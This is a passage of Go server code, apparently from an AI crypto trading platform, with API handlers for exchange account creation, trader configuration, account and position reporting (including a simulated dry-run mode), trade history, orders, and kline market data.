	HyperliquidWalletAddr   string `json:"hyperliquid_wallet_addr"`
	AsterUser               string `json:"aster_user"`
	AsterSigner             string `json:"aster_signer"`
	AsterPrivateKey         string `json:"aster_private_key"`
	LighterWalletAddr       string `json:"lighter_wallet_addr"`
	LighterPrivateKey       string `json:"lighter_private_key"`
	LighterAPIKeyPrivateKey string `json:"lighter_api_key_private_key"`
	LighterAPIKeyIndex      int    `json:"lighter_api_key_index"`
}

// handleCreateExchange Create a new exchange account
func (s *Server) handleCreateExchange(c *gin.Context) {
	userID := c.GetString("user_id")
	cfg := config.Get()

	// Read raw request body
	bodyBytes, err := c.GetRawData()
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Failed to read request body"})
		return
	}

	var req CreateExchangeRequest

	// Check if transport encryption is enabled
	if !cfg.TransportEncryption {
		// Transport encryption disabled, accept plain JSON
		if err := json.Unmarshal(bodyBytes, &req); err != nil {
			logger.Infof("❌ Failed to parse plain JSON request: %v", err)
			c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request format"})
			return
		}
	} else {
		// Transport encryption enabled, require encrypted payload
		var encryptedPayload crypto.EncryptedPayload
		if err := json.Unmarshal(bodyBytes, &encryptedPayload); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request format, encrypted transmission required"})
			return
		}

		if encryptedPayload.WrappedKey == "" {
			c.JSON(http.StatusBadRequest, gin.H{
				"error":   "This endpoint only supports encrypted transmission",
				"code":    "ENCRYPTION_REQUIRED",
				"message": "Encrypted transmission is required for security reasons",
			})
			return
		}

		if s.cryptoHandler.cryptoService == nil {
			c.JSON(http.StatusServiceUnavailable, gin.H{"error": "Encryption service unavailable, please use plaintext mode"})
			return
		}
		decrypted, err := s.cryptoHandler.cryptoService.DecryptSensitiveData(&encryptedPayload)
		if err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "Failed to decrypt data"})
			return
		}

		if err := json.Unmarshal([]byte(decrypted), &req); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "Failed to parse decrypted data"})
			return
		}
	}

	// Validate exchange type
	validTypes := map[string]bool{
		"binance": true, "bybit": true, "okx": true, "bitget": true,
		"hyperliquid": true, "aster": true, "lighter": true, "gate": true, "kucoin": true,
	}
	if !validTypes[req.ExchangeType] {
		c.JSON(http.StatusBadRequest, gin.H{"error": fmt.Sprintf("Invalid exchange type: %s", req.ExchangeType)})
		return
	}

	// Create new exchange account
	id, err := s.store.Exchange().Create(
		userID, req.ExchangeType, req.AccountName, req.Enabled,
		req.APIKey, req.SecretKey, req.Passphrase, req.Testnet,
		req.HyperliquidWalletAddr, req.AsterUser, req.AsterSigner, req.AsterPrivateKey,
		req.LighterWalletAddr, req.LighterPrivateKey, req.LighterAPIKeyPrivateKey, req.LighterAPIKeyIndex,
	)
	if err != nil {
		logger.Infof("❌ Failed to create exchange account: %v", err)
		SafeInternalError(c, "Failed to create exchange account", err)
		return
	}

	logger.Infof("✓ Created exchange account: type=%s, name=%s, id=%s", req.ExchangeType, req.AccountName, id)
	c.JSON(http.StatusOK, gin.H{
		"message": "Exchange account created",
		"id":      id,
	})
}

// handleDeleteExchange Delete an exchange account
func (s *Server) handleDeleteExchange(c *gin.Context) {
	userID := c.GetString("user_id")
	exchangeID := c.Param("id")

	if exchangeID == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Exchange ID is required"})
		return
	}

	// Check if any traders are using this exchange
	traders, err := s.store.Trader().List(userID)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to check traders"})
		return
	}

	for _, trader := range traders {
		if trader.ExchangeID == exchangeID {
			c.JSON(http.StatusBadRequest, gin.H{
				"error":       "Cannot delete exchange account that is in use by traders",
				"trader_id":   trader.ID,
				"trader_name": trader.Name,
			})
			return
		}
	}

	// Delete exchange account
	err = s.store.Exchange().Delete(userID, exchangeID)
	if err != nil {
		logger.Infof("❌ Failed to delete exchange account: %v", err)
		SafeInternalError(c, "Failed to delete exchange account", err)
		return
	}

	logger.Infof("✓ Deleted exchange account: id=%s", exchangeID)
	c.JSON(http.StatusOK, gin.H{"message": "Exchange account deleted"})
}

// handleTraderList Trader list
func (s *Server) handleTraderList(c *gin.Context) {
	userID := c.GetString("user_id")
	traders, err := s.store.Trader().List(userID)
	if err != nil {
		SafeInternalError(c, "Failed to get trader list", err)
		return
	}

	result := make([]map[string]interface{}, 0, len(traders))
	for _, trader := range traders {
		// Get real-time running status
		isRunning := trader.IsRunning
		if at, err := s.traderManager.GetTrader(trader.ID); err == nil {
			status := at.GetStatus()
			if running, ok := status["is_running"].(bool); ok {
				isRunning = running
			}
		}

		// Get strategy name if strategy_id is set
		var strategyName string
		if trader.StrategyID != "" {
			if strategy, err := s.store.Strategy().Get(userID, trader.StrategyID); err == nil {
				strategyName = strategy.Name
			}
		}

		// Return complete AIModelID (e.g. "admin_deepseek"), don't truncate
		// Frontend needs complete ID to verify model exists (consistent with handleGetTraderConfig)
		result = append(result, map[string]interface{}{
			"trader_id":           trader.ID,
			"trader_name":         trader.Name,
			"ai_model":            trader.AIModelID, // Use complete ID
			"exchange_id":         trader.ExchangeID,
			"is_running":          isRunning,
			"show_in_competition": trader.ShowInCompetition,
			"initial_balance":     trader.InitialBalance,
			"strategy_id":         trader.StrategyID,
			"strategy_name":       strategyName,
			"is_dry_run":          trader.IsDryRun,
			"virtual_equity":      trader.VirtualEquity,
		})
	}

	c.JSON(http.StatusOK, result)
}

// handleGetTraderConfig Get trader detailed configuration
func (s *Server) handleGetTraderConfig(c *gin.Context) {
	userID := c.GetString("user_id")
	traderID := c.Param("id")

	if traderID == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Trader ID cannot be empty"})
		return
	}

	fullCfg, err := s.store.Trader().GetFullConfig(userID, traderID)
	if err != nil {
		SafeNotFound(c, "Trader config")
		return
	}
	traderConfig := fullCfg.Trader

	// Get real-time running status
	isRunning := traderConfig.IsRunning
	if at, err := s.traderManager.GetTrader(traderID); err == nil {
		status := at.GetStatus()
		if running, ok := status["is_running"].(bool); ok {
			isRunning = running
		}
	}

	// Return complete model ID without conversion, consistent with frontend model list
	aiModelID := traderConfig.AIModelID

	result := map[string]interface{}{
		"trader_id":             traderConfig.ID,
		"trader_name":           traderConfig.Name,
		"ai_model":              aiModelID,
		"exchange_id":           traderConfig.ExchangeID,
		"strategy_id":           traderConfig.StrategyID,
		"initial_balance":       traderConfig.InitialBalance,
		"scan_interval_minutes": traderConfig.ScanIntervalMinutes,
		"btc_eth_leverage":      traderConfig.BTCETHLeverage,
		"altcoin_leverage":      traderConfig.AltcoinLeverage,
		"trading_symbols":       traderConfig.TradingSymbols,
		"custom_prompt":         traderConfig.CustomPrompt,
		"override_base_prompt":  traderConfig.OverrideBasePrompt,
		"is_cross_margin":       traderConfig.IsCrossMargin,
		"use_ai500":             traderConfig.UseAI500,
		"use_oi_top":            traderConfig.UseOITop,
		"is_running":            isRunning,
		"is_dry_run":            traderConfig.IsDryRun,
		"virtual_equity":        traderConfig.VirtualEquity,
	}

	c.JSON(http.StatusOK, result)
}

// handleStatus System status
func (s *Server) handleStatus(c *gin.Context) {
	_, traderID, err := s.getTraderFromQuery(c)
	if err != nil {
		SafeBadRequest(c, "Invalid trader ID")
		return
	}

	trader, err := s.traderManager.GetTrader(traderID)
	if err != nil {
		SafeNotFound(c, "Trader")
		return
	}

	status := trader.GetStatus()
	c.JSON(http.StatusOK, status)
}

// handleAccount Account information（必须用 DB 中的 ExchangeConfig 创建临时 Trader，确保 Testnet 正确，避免 50101）
func (s *Server) handleAccount(c *gin.Context) {
	userID := c.GetString("user_id")
	_, traderID, err := s.getTraderFromQuery(c)
	if err != nil {
		SafeBadRequest(c, "Invalid trader ID")
		return
	}
	cacheKey := userID + ":" + traderID
	if v, ok := accountCache.Load(cacheKey); ok {
		entry := v.(*ttlCacheEntry)
		if time.Now().Before(entry.Until) {
			c.Data(http.StatusOK, "application/json", entry.Body)
			return
		}
	}

	fullConfig, err := s.store.Trader().GetFullConfig(userID, traderID)
	if err != nil {
		SafeNotFound(c, "Trader")
		return
	}
	traderCfg := fullConfig.Trader
	exchangeCfg := fullConfig.Exchange

	// 模拟盘：财务看板完全本地化，用 VirtualEquity + dry_run 持仓浮盈
	if traderCfg != nil && traderCfg.IsDryRun {
		virtualEquity := traderCfg.VirtualEquity
		if virtualEquity <= 0 {
			virtualEquity = 10000
		}
		openPositions, errPos := s.store.Position().GetOpenPositionsBySource(traderID, "dry_run")
		if errPos != nil {
			SafeInternalError(c, "Get dry-run positions for account", errPos)
			return
		}
		exchangeType := "binance"
		if exchangeCfg != nil {
			exchangeType = exchangeCfg.ExchangeType
		}
		totalUnrealizedProfit := 0.0
		totalMarginUsed := 0.0
		for _, pos := range openPositions {
			markPrice := pos.EntryPrice
			if data, errMarket := market.GetWithExchange(pos.Symbol, exchangeType, nil); errMarket == nil {
				markPrice = data.CurrentPrice
			}
			lev := pos.Leverage
			if lev <= 0 {
				lev = 10
			}
			if pos.Side == "LONG" {
				totalUnrealizedProfit += (markPrice - pos.EntryPrice) * pos.Quantity
			} else {
				totalUnrealizedProfit += (pos.EntryPrice - markPrice) * pos.Quantity
			}
			totalMarginUsed += (pos.Quantity * markPrice) / float64(lev)
		}
		totalEquity := virtualEquity + totalUnrealizedProfit
		initialBalance := traderCfg.InitialBalance
		if initialBalance <= 0 {
			initialBalance = virtualEquity
		}
		totalPnL := totalEquity - initialBalance
		totalPnLPct := 0.0
		if initialBalance > 0 {
			totalPnLPct = (totalPnL / initialBalance) * 100
		}
		marginUsedPct := 0.0
		if totalEquity > 0 {
			marginUsedPct = (totalMarginUsed / totalEquity) * 100
		}
		account := map[string]interface{}{
			"total_equity":      totalEquity,
			"wallet_balance":    virtualEquity,
			"unrealized_profit": totalUnrealizedProfit,
			"available_balance": virtualEquity - totalMarginUsed,
			"total_pnl":         totalPnL,
			"total_pnl_pct":     totalPnLPct,
			"initial_balance":   initialBalance,
			"daily_pnl":         0.0,
			"position_count":    len(openPositions),
			"margin_used":       totalMarginUsed,
			"margin_used_pct":   marginUsedPct,
		}
		body, _ := json.Marshal(account)
		accountCache.Store(cacheKey, &ttlCacheEntry{Body: body, Until: time.Now().Add(accountPositionsCacheTTL)})
		c.Data(http.StatusOK, "application/json", body)
		return
	}

	if exchangeCfg == nil || !exchangeCfg.Enabled {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Exchange not configured or not enabled"})
		return
	}

	tempTrader, createErr := s.createTempTraderFromExchangeConfig(exchangeCfg, userID)
	if createErr != nil || tempTrader == nil {
		logger.Infof("⚠️ handleAccount create temp trader failed: %v", createErr)
		SafeInternalError(c, "Failed to connect to exchange", createErr)
		return
	}

	balance, err := tempTrader.GetBalance()
	if err != nil {
		SafeInternalError(c, "Get account info", err)
		return
	}
	positions, err := tempTrader.GetPositions()
	if err != nil {
		SafeInternalError(c, "Get positions for account", err)
		return
	}

	// 与 AutoTrader.GetAccountInfo 一致的字段构建
	totalWalletBalance, _ := balance["totalWalletBalance"].(float64)
	totalUnrealizedProfit, _ := balance["totalUnrealizedProfit"].(float64)
	availableBalance, _ := balance["availableBalance"].(float64)
	totalEquity, _ := balance["totalEquity"].(float64)
	if totalEquity <= 0 {
		totalEquity = totalWalletBalance + totalUnrealizedProfit
	}
	initialBalance := fullConfig.Trader.InitialBalance
	totalPnL := totalEquity - initialBalance
	totalPnLPct := 0.0
	if initialBalance > 0 {
		totalPnLPct = (totalPnL / initialBalance) * 100
	}
	totalMarginUsed := 0.0
	for _, pos := range positions {
		markPrice, _ := pos["markPrice"].(float64)
		quantity, _ := pos["positionAmt"].(float64)
		if quantity < 0 {
			quantity = -quantity
		}
		leverage := 10.0
		if lev, ok := pos["leverage"].(float64); ok && lev > 0 {
			leverage = lev
		}
		totalMarginUsed += (quantity * markPrice) / leverage
	}
	marginUsedPct := 0.0
	if totalEquity > 0 {
		marginUsedPct = (totalMarginUsed / totalEquity) * 100
	}

	account := map[string]interface{}{
		"total_equity":      totalEquity,
		"wallet_balance":    totalWalletBalance,
		"unrealized_profit": totalUnrealizedProfit,
		"available_balance": availableBalance,
		"total_pnl":         totalPnL,
		"total_pnl_pct":     totalPnLPct,
		"initial_balance":   initialBalance,
		"daily_pnl":         0.0,
		"position_count":    len(positions),
		"margin_used":       totalMarginUsed,
		"margin_used_pct":   marginUsedPct,
	}
	logger.Infof("✓ Returning account info [%s]: equity=%.2f, available=%.2f, pnl=%.2f (%.2f%%)",
		fullConfig.Trader.Name, totalEquity, availableBalance, totalPnL, totalPnLPct)
	body, _ := json.Marshal(account)
	accountCache.Store(cacheKey, &ttlCacheEntry{Body: body, Until: time.Now().Add(accountPositionsCacheTTL)})
	c.Data(http.StatusOK, "application/json", body)
}

// handlePositions Position list（必须用 DB 中的 ExchangeConfig 创建临时 Trader，确保 Testnet 正确，避免 50101）
func (s *Server) handlePositions(c *gin.Context) {
	userID := c.GetString("user_id")
	_, traderID, err := s.getTraderFromQuery(c)
	if err != nil {
		SafeBadRequest(c, "Invalid trader ID")
		return
	}
	cacheKey := userID + ":" + traderID
	if v, ok := positionsCache.Load(cacheKey); ok {
		entry := v.(*ttlCacheEntry)
		if time.Now().Before(entry.Until) {
			c.Data(http.StatusOK, "application/json", entry.Body)
			return
		}
	}

	fullConfig, err := s.store.Trader().GetFullConfig(userID, traderID)
	if err != nil {
		SafeNotFound(c, "Trader")
		return
	}
	traderCfg := fullConfig.Trader
	exchangeCfg := fullConfig.Exchange

	// 模拟盘：从 DB 取 source='dry_run' 且 status=OPEN 的持仓，用行情当前价作为 mark_price，本地算浮盈
	if traderCfg != nil && traderCfg.IsDryRun {
		openPositions, errPos := s.store.Position().GetOpenPositionsBySource(traderID, "dry_run")
		if errPos != nil {
			SafeInternalError(c, "Get dry-run positions", errPos)
			return
		}
		exchangeType := "binance"
		if exchangeCfg != nil {
			exchangeType = exchangeCfg.ExchangeType
		}
		out := make([]map[string]interface{}, 0, len(openPositions))
		for _, pos := range openPositions {
			markPrice := pos.EntryPrice
			if data, errMarket := market.GetWithExchange(pos.Symbol, exchangeType, nil); errMarket == nil {
				markPrice = data.CurrentPrice
			}
			lev := pos.Leverage
			if lev <= 0 {
				lev = 10
			}
			var unrealizedPnl float64
			if pos.Side == "LONG" {
				unrealizedPnl = (markPrice - pos.EntryPrice) * pos.Quantity
			} else {
				unrealizedPnl = (pos.EntryPrice - markPrice) * pos.Quantity
			}
			unrealizedPnlPct := 0.0
			if pos.EntryPrice > 0 && pos.Quantity > 0 {
				unrealizedPnlPct = (unrealizedPnl / (pos.EntryPrice * pos.Quantity)) * 100
			}
			marginUsed := (pos.Quantity * markPrice) / float64(lev)
			out = append(out, map[string]interface{}{
				"symbol":                 pos.Symbol,
				"side":                   strings.ToLower(pos.Side),
				"entry_price":            pos.EntryPrice,
				"mark_price":             markPrice,
				"quantity":               pos.Quantity,
				"leverage":               lev,
				"unrealized_pnl":         unrealizedPnl,
				"unrealized_pnl_pct":     unrealizedPnlPct,
				"liquidation_price":      0.0,
				"margin_used":            marginUsed,
				"source":                 "dry_run",
				"ai_reasoning_at_open":   pos.AiReasoningAtOpen,
			})
		}
		body, _ := json.Marshal(out)
		positionsCache.Store(cacheKey, &ttlCacheEntry{Body: body, Until: time.Now().Add(accountPositionsCacheTTL)})
		c.Data(http.StatusOK, "application/json", body)
		return
	}

	if exchangeCfg == nil || !exchangeCfg.Enabled {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Exchange not configured or not enabled"})
		return
	}

	tempTrader, createErr := s.createTempTraderFromExchangeConfig(exchangeCfg, userID)
	if createErr != nil || tempTrader == nil {
		logger.Infof("⚠️ handlePositions create temp trader failed: %v", createErr)
		SafeInternalError(c, "Failed to connect to exchange", createErr)
		return
	}

	positions, err := tempTrader.GetPositions()
	if err != nil {
		SafeInternalError(c, "Get positions", err)
		return
	}
	// 统一映射为前端期望的 snake_case 且数值类型，避免 OKX 等返回 string 或 camelCase 导致前端崩溃
	out := normalizePositionsForFrontend(positions)
	body, _ := json.Marshal(out)
	positionsCache.Store(cacheKey, &ttlCacheEntry{Body: body, Until: time.Now().Add(accountPositionsCacheTTL)})
	c.Data(http.StatusOK, "application/json", body)
}

// normalizePositionsForFrontend 将各交易所的持仓 map 转为前端 Position 结构（snake_case，数值保证为 number）
func normalizePositionsForFrontend(positions []map[string]interface{}) []map[string]interface{} {
	if len(positions) == 0 {
		return positions
	}
	out := make([]map[string]interface{}, 0, len(positions))
	for _, p := range positions {
		entryPrice := toFloat64(p["entryPrice"], p["entry_price"])
		markPrice := toFloat64(p["markPrice"], p["mark_price"])
		quantity := toFloat64(p["positionAmt"], p["quantity"])
		if quantity < 0 {
			quantity = -quantity
		}
		unrealizedPnl := toFloat64(p["unRealizedProfit"], p["unrealized_pnl"])
		leverage := toFloat64(p["leverage"], p["leverage"])
		liqPrice := toFloat64(p["liquidationPrice"], p["liqPx"], p["liquidation_price"])
		marginUsed := toFloat64(p["margin"], p["margin_used"])
		side, _ := p["side"].(string)
		if side == "" {
			side = "long"
		}
		symbol, _ := p["symbol"].(string)
		unrealizedPnlPct := 0.0
		if entryPrice > 0 && quantity > 0 {
			unrealizedPnlPct = (unrealizedPnl / (entryPrice * quantity)) * 100
		}
		out = append(out, map[string]interface{}{
			"symbol":             symbol,
			"side":               strings.ToLower(side),
			"entry_price":        entryPrice,
			"mark_price":         markPrice,
			"quantity":           quantity,
			"leverage":           leverage,
			"unrealized_pnl":     unrealizedPnl,
			"unrealized_pnl_pct": unrealizedPnlPct,
			"liquidation_price":  liqPrice,
			"margin_used":        marginUsed,
		})
	}
	return out
}

func toFloat64(vals ...interface{}) float64 {
	for _, v := range vals {
		if v == nil {
			continue
		}
		switch x := v.(type) {
		case float64:
			return x
		case int:
			return float64(x)
		case int64:
			return float64(x)
		case string:
			f, _ := strconv.ParseFloat(x, 64)
			return f
		}
	}
	return 0
}

// handlePositionHistory Historical closed positions with statistics
func (s *Server) handlePositionHistory(c *gin.Context) {
	userID := c.GetString("user_id")
	_, traderID, err := s.getTraderFromQuery(c)
	if err != nil {
		SafeBadRequest(c, "Invalid trader ID")
		return
	}

	limitStr := c.DefaultQuery("limit", "100")
	limit := 100
	if l, err := strconv.Atoi(limitStr); err == nil && l > 0 && l <= 500 {
		limit = l
	}

	// 模拟盘：强制 source=dry_run，仅返回模拟盘已平仓记录
	fullConfig, _ := s.store.Trader().GetFullConfig(userID, traderID)
	if fullConfig != nil && fullConfig.Trader != nil && fullConfig.Trader.IsDryRun {
		positions, errPos := s.store.Position().GetClosedPositionsBySource(traderID, limit, "dry_run")
		if errPos != nil {
			SafeInternalError(c, "Get position history", errPos)
			return
		}
		stats, _ := s.store.Position().GetFullStatsBySource(traderID, "dry_run")
		symbolStats, _ := s.store.Position().GetSymbolStatsBySource(traderID, 10, "dry_run")
		directionStats, _ := s.store.Position().GetDirectionStatsBySource(traderID, "dry_run")
		c.JSON(http.StatusOK, gin.H{
			"positions":       positions,
			"stats":           stats,
			"symbol_stats":    symbolStats,
			"direction_stats": directionStats,
		})
		return
	}

	trader, err := s.traderManager.GetTrader(traderID)
	if err != nil {
		SafeNotFound(c, "Trader")
		return
	}
	store := trader.GetStore()
	if store == nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Store not available"})
		return
	}
	positions, err := store.Position().GetClosedPositions(trader.GetID(), limit)
	if err != nil {
		SafeInternalError(c, "Get position history", err)
		return
	}
	stats, _ := store.Position().GetFullStats(trader.GetID())
	symbolStats, _ := store.Position().GetSymbolStats(trader.GetID(), 10)
	directionStats, _ := store.Position().GetDirectionStats(trader.GetID())
	c.JSON(http.StatusOK, gin.H{
		"positions":       positions,
		"stats":           stats,
		"symbol_stats":    symbolStats,
		"direction_stats": directionStats,
	})
}

// handleTrades Historical trades list (Recent Trades)；模拟盘时仅返回 source=dry_run 并带 source 字段供前端显示 [Paper]
func (s *Server) handleTrades(c *gin.Context) {
	userID := c.GetString("user_id")
	_, traderID, err := s.getTraderFromQuery(c)
	if err != nil {
		SafeBadRequest(c, "Invalid trader ID")
		return
	}

	symbol := c.Query("symbol")
	limitStr := c.DefaultQuery("limit", "100")
	limit := 100
	if l, err := strconv.Atoi(limitStr); err == nil && l > 0 {
		limit = l
	}
	if symbol != "" {
		symbol = market.Normalize(symbol)
	}

	// 模拟盘：仅查 source=dry_run，返回带 source 的列表供前端显示 [Paper]
	fullConfig, _ := s.store.Trader().GetFullConfig(userID, traderID)
	if fullConfig != nil && fullConfig.Trader != nil && fullConfig.Trader.IsDryRun {
		allTrades, errT := s.store.Position().GetRecentTradesBySource(traderID, limit, "dry_run")
		if errT != nil {
			SafeInternalError(c, "Get trades", errT)
			return
		}
		if symbol != "" {
			var result []interface{}
			for _, t := range allTrades {
				if t.Symbol == symbol {
					result = append(result, t)
				}
			}
			c.JSON(http.StatusOK, result)
			return
		}
		c.JSON(http.StatusOK, allTrades)
		return
	}

	trader, err := s.traderManager.GetTrader(traderID)
	if err != nil {
		SafeNotFound(c, "Trader")
		return
	}
	store := trader.GetStore()
	if store == nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Store not available"})
		return
	}
	allTrades, err := store.Position().GetRecentTrades(trader.GetID(), limit)
	if err != nil {
		SafeInternalError(c, "Get trades", err)
		return
	}
	if symbol != "" {
		var result []interface{}
		for _, trade := range allTrades {
			if trade.Symbol == symbol {
				result = append(result, trade)
			}
		}
		c.JSON(http.StatusOK, result)
		return
	}
	c.JSON(http.StatusOK, allTrades)
}

// handleOrders Order list (all orders including open, close, stop loss, take profit, etc.)
func (s *Server) handleOrders(c *gin.Context) {
	_, traderID, err := s.getTraderFromQuery(c)
	if err != nil {
		SafeBadRequest(c, "Invalid trader ID")
		return
	}

	trader, err := s.traderManager.GetTrader(traderID)
	if err != nil {
		SafeNotFound(c, "Trader")
		return
	}

	// Get optional query parameters
	symbol := c.Query("symbol")
	statusFilter := c.Query("status") // NEW, FILLED, CANCELED, etc.
	limitStr := c.DefaultQuery("limit", "100")
	limit := 100
	if l, err := strconv.Atoi(limitStr); err == nil && l > 0 {
		limit = l
	}

	// Normalize symbol (add USDT suffix if not present)
	if symbol != "" {
		symbol = market.Normalize(symbol)
	}

	// Get orders from store
	store := trader.GetStore()
	if store == nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Store not available"})
		return
	}

	// Get orders with filters applied at database level
	orders, err := store.Order().GetTraderOrdersFiltered(trader.GetID(), symbol, statusFilter, limit)
	if err != nil {
		SafeInternalError(c, "Get orders", err)
		return
	}

	c.JSON(http.StatusOK, orders)
}

// handleOrderFills Order fill details (all fills for a specific order)
func (s *Server) handleOrderFills(c *gin.Context) {
	orderIDStr := c.Param("id")
	orderID, err := strconv.ParseInt(orderIDStr, 10, 64)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid order ID"})
		return
	}

	_, traderID, err := s.getTraderFromQuery(c)
	if err != nil {
		SafeBadRequest(c, "Invalid trader ID")
		return
	}

	trader, err := s.traderManager.GetTrader(traderID)
	if err != nil {
		SafeNotFound(c, "Trader")
		return
	}

	store := trader.GetStore()
	if store == nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Store not available"})
		return
	}

	// Get fills for this order
	fills, err := store.Order().GetOrderFills(orderID)
	if err != nil {
		SafeInternalError(c, "Get order fills", err)
		return
	}

	c.JSON(http.StatusOK, fills)
}

// handleOpenOrders Get open orders (pending SL/TP) from exchange
func (s *Server) handleOpenOrders(c *gin.Context) {
	_, traderID, err := s.getTraderFromQuery(c)
	if err != nil {
		SafeBadRequest(c, "Invalid trader ID")
		return
	}

	trader, err := s.traderManager.GetTrader(traderID)
	if err != nil {
		SafeNotFound(c, "Trader")
		return
	}

	// Get symbol parameter (required for exchange query)
	symbol := c.Query("symbol")
	if symbol == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "symbol parameter is required"})
		return
	}

	// Normalize symbol
	symbol = market.Normalize(symbol)

	// Get open orders from exchange
	openOrders, err := trader.GetOpenOrders(symbol)
	if err != nil {
		SafeInternalError(c, "Get open orders", err)
		return
	}

	c.JSON(http.StatusOK, openOrders)
}

// handleKlines K-line data (supports multiple exchanges via coinank)
func (s *Server) handleKlines(c *gin.Context) {
	// Get query parameters
	symbol := c.Query("symbol")
	if symbol == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "symbol parameter is required"})
		return
	}

	interval := c.DefaultQuery("interval", "5m")
	exchange := c.DefaultQuery("exchange", "binance") // Default to binance for backward compatibility
	limitStr := c.DefaultQuery("limit", "1000")
	limit, err := strconv.Atoi(limitStr)
	if err != nil || limit <= 0 {
		limit = 1000
	}

	// Coinank API has a maximum limit of 1500 klines per request
	if limit > 1500 {
		limit = 1500
	}

	var klines []market.Kline
	exchangeLower := strings.ToLower(exchange)

	// Route to appropriate data source based on exchange type
	switch exchangeLower {
	case "alpaca":
		// US Stocks via Alpaca
		klines, err = s.getKlinesFromAlpaca(symbol, interval, limit)
		if err != nil {
			SafeInternalError(c, "Get klines from Alpaca", err)
			return
		}
	case "forex", "metals":
		// Forex and Metals via Twelve Data
		klines, err = s.getKlinesFromTwelveData(symbol, interval, limit)
		if err != nil {
			SafeInternalError(c, "Get klines from TwelveData", err)
			return
		}
	case "hyperliquid", "hyperliquid-xyz", "xyz":
		// Hyperliquid native API - supports both crypto perps and stock perps (xyz dex)
		klines, err = s.getKlinesFromHyperliquid(symbol, interval, limit)
		if err != nil {
			SafeInternalError(c, "Get klines from Hyperliquid", err)
			return
		}
	default:
		// Crypto exchanges via CoinAnk
		symbol = market.Normalize(symbol)
		klines, err = s.getKlinesFromCoinank(symbol, interval, exchange, limit)
		if err != nil {
			SafeInternalError(c, "Get klines from CoinAnk", err)
			return
		}
	}

	c.JSON(http.StatusOK, klines)
}

// getKlinesFromCoinank fetches kline data from coinank free/open API for multiple exchanges
func (s *Server) getKlinesFromCoinank(symbol, interval, exchange string, limit int) ([]market.Kline, error) {
	// Map exchange string to coinank enum
	var coinankExchange coinank_enum.Exchange
	switch strings.ToLower(exchange) {
	case "binance":
		coinankExchange = coinank_enum.Binance
	case "bybit":
		coinankExchange = coinank_enum.Bybit
	case "okx":
		coinankExchange = coinank_enum.Okex
	case "bitget":
		coinankExchange = coinank_enum.Bitget
	case "gate":
		coinankExchange = coinank_enum.Gate
	case "aster":
		coinankExchange = coinank_enum.Aster
	case "lighter":
		// Lighter doesn't have direct CoinAnk support, use Binance data as fallback
		coinankExchange = coinank_enum.Binance
	case "kucoin":
		// KuCoin doesn't have direct CoinAnk support, use Binance data as fallback
		coinankExchange = coinank_enum.Binance
	default:
		// For any unknown exchange, default to Binance
		logger.Warnf("⚠️ Unknown exchange '%s', defaulting to Binance for CoinAnk", exchange)
		coinankExchange = coinank_enum.Binance
	}

	// Map interval string to coinank enum
	var coinankInterval coinank_enum.Interval
	switch interval {
	case "1s":
		coinankInterval = coinank_enum.Second1
	case "5s":
		coinankInterval = coinank_enum.Second5
	case "10s":
		coinankInterval = coinank_enum.Second10
	case "30s":
		coinankInterval = coinank_enum.Second30
	case "1m":
		coinankInterval = coinank_enum.Minute1
	case "3m":
		coinankInterval = coinank_enum.Minute3
	case "5m":
		coinankInterval = coinank_enum.Minute5
	case "10m":
		coinankInterval = coinank_enum.Minute10
	case "15m":
		coinankInterval = coinank_enum.Minute15
	case "30m":
		coinankInterval = coinank_enum.Minute30
	case "1h":
		coinankInterval = coinank_enum.Hour1
	case "2h":
		coinankInterval = coinank_enum.Hour2
	case "4h":
		coinankInterval = coinank_enum.Hour4
	case "6h":
		coinankInterval = coinank_enum.Hour6
	case "8h":
		coinankInterval = coinank_enum.Hour8
	case "12h":
		coinankInterval = coinank_enum.Hour12
	case "1d":
		coinankInterval = coinank_enum.Day1
	case "3d":
		coinankInterval = coinank_enum.Day3
	case "1w":
		coinankInterval = coinank_enum.Week1
	case "1M":
		coinankInterval = coinank_enum.Month1
	default:
		return nil, fmt.Errorf("unsupported interval for coinank: %s", interval)
	}

	// Convert symbol format for different exchanges
	// OKX uses "BTC-USDT-SWAP" format instead of "BTCUSDT"
	apiSymbol := symbol
	if coinankExchange == coinank_enum.Okex {
		// Convert BTCUSDT -> BTC-USDT-SWAP
		if strings.HasSuffix(symbol, "USDT") {
			base := strings.TrimSuffix(symbol, "USDT")
			apiSymbol = fmt.Sprintf("%s-USDT-SWAP", base)
		}
	}

	// Call coinank free/open API (no authentication required)
	ctx := context.Background()
	ts := time.Now().UnixMilli()
	// Use "To" side to search backward from current time (get historical klines)
	coinankKlines, err := coinank_api.Kline(ctx, apiSymbol, coinankExchange, ts, coinank_enum.To, limit, coinankInterval)
	if err != nil {
		// Free API doesn't support all exchanges (e.g., OKX, Bitget)
		// Fallback to Binance data as reference
		if coinankExchange != coinank_enum.Binance {
			logger.Warnf("⚠️ CoinAnk free API doesn't support %s, falling back to Binance data", coinankExchange)
			coinankKlines, err = coinank_api.Kline(ctx, symbol, coinank_enum.Binance, ts, coinank_enum.To, limit, coinankInterval)
			if err != nil {
				return nil, fmt.Errorf("coinank API error (fallback): %w", err)
			}
		} else {
			return nil, fmt.Errorf("coinank API error: %w", err)
		}
	}

	// Convert coinank kline format to market.Kline format
	// Coinank: Volume = BTC 数量, Quantity = USDT 成交额
	klines := make([]market.Kline, len(coinankKlines))
	for i, ck := range coinankKlines {
		klines[i] = market.Kline{
			OpenTime:    ck.StartTime,
			Open:        ck.Open,
			High:        ck.High,
			Low:         ck.Low,
			Close:       ck.Close,
			Volume:      ck.Volume,   // BTC 数量
			QuoteVolume: ck.Quantity, // USDT 成交额
			CloseTime:   ck.EndTime,
		}
	}

